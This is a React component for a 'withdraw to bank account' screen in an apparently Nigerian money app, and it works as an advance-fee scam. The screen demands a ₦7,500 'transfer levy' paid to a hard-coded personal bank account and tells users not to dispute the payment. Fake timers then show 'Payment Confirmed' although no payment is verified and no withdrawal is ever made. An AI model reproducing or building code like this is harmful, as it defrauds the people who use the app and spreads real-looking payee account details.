
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent } from '@/components/ui/card';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { ArrowLeft, Copy, Loader2, CheckCircle } from 'lucide-react';
import { nigerianBanks } from '@/utils/banks';
import { toast } from '@/hooks/use-toast';

interface WithdrawalPageProps {
  onBack: () => void;
  balance: number;
  onWithdraw: (amount: number) => void;
}

const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWithdraw }) => {
  const [accountNumber, setAccountNumber] = useState('');
  const [selectedBank, setSelectedBank] = useState('');
  const [accountName, setAccountName] = useState('');
  const [amount, setAmount] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showWithdrawalNotice, setShowWithdrawalNotice] = useState(false);
  const [showPaymentDetails, setShowPaymentDetails] = useState(false);
  const [showTransferNotice, setShowTransferNotice] = useState(false);
  const [showProcessingPayment, setShowProcessingPayment] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [currentStep, setCurrentStep] = useState(1);

  const handleProceed = () => {
    if (!accountNumber || !selectedBank || !accountName || !amount) {
      toast({
        title: "Error",
        description: "Please fill in all fields",
        duration: 3000,
      });
      return;
    }

    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setShowWithdrawalNotice(true);
    }, 3000);
  };

  const handleWithdrawalNoticeConfirm = () => {
    setShowWithdrawalNotice(false);
    setIsLoading(true);
    
    setTimeout(() => {
      setIsLoading(false);
      setShowPaymentDetails(true);
    }, 5000);
  };

  const handleShowTransferNotice = () => {
    setShowPaymentDetails(false);
    setShowTransferNotice(true);
  };

  const handleContinuePayment = () => {
    setShowTransferNotice(false);
    setShowPaymentDetails(true);
  };

  const handlePaymentConfirm = () => {
    setShowPaymentDetails(false);
    setShowProcessingPayment(true);
    
    setTimeout(() => {
      setShowProcessingPayment(false);
      setShowSuccess(true);
      onWithdraw(7500); // Debit the withdrawal amount
    }, 10000);
  };

  const handleSuccessClose = () => {
    setShowSuccess(false);
    onBack();
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied!",
      description: `${label} copied to clipboard`,
      duration: 2000,
    });
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white px-4 py-4 shadow-sm">
        <div className="flex items-center space-x-3">
          <button
            onClick={onBack}
            className="p-2 hover:bg-gray-100 rounded-full transition-colors"
          >
            <ArrowLeft className="w-6 h-6 text-gray-600" />
          </button>
          <h1 className="text-xl font-semibold text-gray-900">Withdraw To Bank Account</h1>
        </div>
      </div>

      <div className="px-4 py-6">
        <Card>
          <CardContent className="p-6 space-y-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Account Number</label>
              <Input
                placeholder="Enter account number"
                value={accountNumber}
                onChange={(e) => setAccountNumber(e.target.value)}
                className="w-full"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Bank Name</label>
              <Select value={selectedBank} onValueChange={setSelectedBank}>
                <SelectTrigger className="w-full">
                  <SelectValue placeholder="Select Bank" />
                </SelectTrigger>
                <SelectContent>
                  {nigerianBanks.map((bank) => (
                    <SelectItem key={bank} value={bank}>
                      {bank}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Account Name</label>
              <Input
                placeholder="Account Name"
                value={accountName}
                onChange={(e) => setAccountName(e.target.value)}
                className="w-full"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Amount</label>
              <Input
                placeholder="Enter amount"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                type="number"
                className="w-full"
              />
            </div>

            <div className="text-center">
              <p className="text-lg font-semibold text-green-600">
                Available Balance: ₦{balance.toLocaleString()}.00
              </p>
            </div>

            <Button
              onClick={handleProceed}
              disabled={isLoading}
              className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-full"
            >
              {isLoading ? (
                <div className="flex items-center space-x-2">
                  <Loader2 className="w-4 h-4 animate-spin" />
                  <span>Processing...</span>
                </div>
              ) : (
                'Proceed'
              )}
            </Button>
          </CardContent>
        </Card>
      </div>

      {/* Withdrawal Notice Dialog */}
      <Dialog open={showWithdrawalNotice} onOpenChange={() => {}}>
        <DialogContent className="max-w-sm mx-auto">
          <DialogHeader>
            <DialogTitle className="text-center">Withdrawal Notice</DialogTitle>
          </DialogHeader>
          <div className="text-center py-4">
            <p className="text-gray-600 mb-4">
              Withdrawal places you will be paying ₦7,500 as an electronic money transfer levy to approve this transaction
            </p>
            <div className="flex space-x-3">
              <Button variant="outline" onClick={() => setShowWithdrawalNotice(false)} className="flex-1">
                Back
              </Button>
              <Button onClick={handleWithdrawalNoticeConfirm} className="flex-1 bg-green-600 hover:bg-green-700">
                Proceed
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Payment Details Dialog */}
      <Dialog open={showPaymentDetails} onOpenChange={() => {}}>
        <DialogContent className="max-w-sm mx-auto">
          <div className="text-center py-6 space-y-6">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
              <div className="w-8 h-8 bg-green-600 rounded flex items-center justify-center">
                <div className="w-4 h-1 bg-white rounded"></div>
              </div>
            </div>
            
            <h2 className="text-xl font-semibold">Make Payment</h2>
            <p className="text-gray-600">Transfer to the account below</p>

            <div className="space-y-4 text-left">
              <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
                <div>
                  <p className="text-sm text-gray-600">Account Number</p>
                  <p className="font-semibold">1040202653</p>
                </div>
                <button 
                  onClick={() => copyToClipboard('1040202653', 'Account number')}
                  className="p-2 hover:bg-gray-200 rounded"
                >
                  <Copy className="w-4 h-4" />
                </button>
              </div>

              <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
                <div>
                  <p className="text-sm text-gray-600">Bank Name</p>
                  <p className="font-semibold">VDF MFB</p>
                </div>
                <button 
                  onClick={() => copyToClipboard('VDF MFB', 'Bank name')}
                  className="p-2 hover:bg-gray-200 rounded"
                >
                  <Copy className="w-4 h-4" />
                </button>
              </div>

              <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
                <div>
                  <p className="text-sm text-gray-600">Account Name</p>
                  <p className="font-semibold">Jude Samuel-money app</p>
                </div>
                <button 
                  onClick={() => copyToClipboard('Jude Samuel-money app', 'Account name')}
                  className="p-2 hover:bg-gray-200 rounded"
                >
                  <Copy className="w-4 h-4" />
                </button>
              </div>
            </div>

            <div className="p-4 bg-green-50 border border-green-200 rounded">
              <p className="text-sm text-gray-600">Fee</p>
              <p className="text-2xl font-bold text-green-600">₦7,500</p>
            </div>

            <div className="space-y-3">
              <Button 
                onClick={handleShowTransferNotice}
                className="w-full bg-green-600 hover:bg-green-700 text-white"
              >
                Continue Payment
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Transfer Notice Dialog */}
      <Dialog open={showTransferNotice} onOpenChange={() => {}}>
        <DialogContent className="max-w-sm mx-auto">
          <div className="text-center py-6 space-y-6">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
              <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center">
                <div className="w-4 h-4 bg-white rounded-full"></div>
              </div>
            </div>
            
            <h2 className="text-xl font-semibold">Pay NGN ₦7,500.00</h2>
            <p className="text-gray-600">Before you make this transfer</p>

            <div className="space-y-4 text-left">
              <div className="flex items-start space-x-3">
                <CheckCircle className="w-5 h-5 text-green-600 mt-0.5" />
                <div>
                  <p className="font-semibold text-orange-600">Transfer only the exact amount</p>
                  <p className="text-sm text-gray-600">Do not transfer an incorrect amount.</p>
                </div>
              </div>

              <div className="flex items-start space-x-3">
                <CheckCircle className="w-5 h-5 text-green-600 mt-0.5" />
                <div>
                  <p className="font-semibold text-orange-600">Do not dispute any transactions to our account</p>
                  <p className="text-sm text-gray-600">It can cause restrictions and other impacts.</p>
                </div>
              </div>

              <div className="flex items-start space-x-3">
                <CheckCircle className="w-5 h-5 text-green-600 mt-0.5" />
                <div>
                  <p className="font-semibold text-orange-600">Avoid sending fake payment proofs</p>
                  <p className="text-sm text-gray-600">This can lead to your account being permanently blocked.</p>
                </div>
              </div>

              <div className="flex items-start space-x-3 p-3 bg-blue-50 rounded">
                <input type="checkbox" className="mt-1" defaultChecked />
                <p className="text-sm">I understand these instructions.</p>
              </div>
            </div>

            <Button 
              onClick={handleContinuePayment}
              className="w-full bg-green-600 hover:bg-green-700 text-white"
            >
              Proceed
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Processing Payment Dialog */}
      <Dialog open={showProcessingPayment} onOpenChange={() => {}}>
        <DialogContent className="max-w-sm mx-auto border-0 bg-green-600 text-white">
          <div className="text-center py-12 space-y-6">
            <h2 className="text-2xl font-bold">Processing Payment</h2>
            <div className="flex justify-center">
              <div className="w-16 h-16 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
            </div>
            <p className="text-green-100">Verifying your payment...</p>
          </div>
        </DialogContent>
      </Dialog>

      {/* Success Dialog */}
      <Dialog open={showSuccess} onOpenChange={() => {}}>
        <DialogContent className="max-w-sm mx-auto">
          <div className="text-center py-6 space-y-6">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
              <CheckCircle className="w-8 h-8 text-green-600" />
            </div>
            
            <div>
              <h2 className="text-xl font-semibold mb-2">Payment Confirmed</h2>
              <p className="text-gray-600">
                Payment confirmed successful your withdrawal has been approved you will get credited shortly
              </p>
            </div>

            <Button 
              onClick={handleSuccessClose}
              className="w-full bg-green-600 hover:bg-green-700 text-white"
            >
              Continue
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default WithdrawalPage;
